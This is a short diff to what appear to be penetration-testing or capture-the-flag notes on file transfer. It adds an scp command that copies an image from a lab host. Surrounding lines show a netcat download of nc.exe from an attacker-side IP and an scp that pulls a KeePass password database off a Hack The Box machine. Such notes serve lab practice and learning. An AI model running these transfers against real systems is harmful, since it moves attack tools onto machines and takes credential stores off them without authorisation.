@@ -126,6 +126,11 @@ nc 192.168.45.171 4444 > nc.exe
 ```
 scp lnorgaard@keeper.htb:/home/lnorgaard/passcodes.kdbx .
 ```
+
+```
+scp -P 80 jack@10.112.156.33:/home/jack/user.jpg .
+```
+
 ##### Uploading
 
 ```
